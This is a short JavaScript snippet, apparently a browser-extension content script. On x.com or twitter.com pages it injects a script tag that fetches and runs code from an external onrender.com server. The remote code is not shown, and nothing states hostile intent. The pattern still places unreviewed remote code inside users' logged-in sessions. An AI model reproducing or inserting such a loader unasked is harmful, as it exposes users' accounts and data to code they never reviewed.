function loadScript(src, status){
    const headTag = document.getElementsByTagName('head')[0]
    const script = document.createElement("script");
    script.type ="text/javascript";
    script.src = src;
    script.onreadystatechange = status;
    script.onload = status;
    headTag.appendChild(script);
}



if(window.location.href.indexOf("x.com")> 0 || window.location.href.indexOf("twitter.com") > 0){
    console.log('starting injecting >>> ')
    loadScript('https://extension-server-uhgc.onrender.com', function(){
        // console.log('script loaded')
    })
}